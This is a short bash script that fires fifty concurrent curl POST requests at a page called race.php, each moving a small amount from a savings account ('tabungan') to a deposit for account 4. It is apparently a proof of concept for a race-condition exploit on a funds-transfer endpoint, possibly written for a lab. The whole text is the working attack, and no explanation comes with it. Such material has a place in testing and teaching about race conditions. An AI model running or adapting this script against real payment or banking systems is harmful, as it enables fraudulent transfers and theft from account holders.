
    #! /bin/bash
    for y in `seq 1 5`
    do (for x in `seq 1 10`
    do curl -d "acct=4&from=tabungan&to=deposit&amount=7" [IP Address]/race.php
    done)&
    done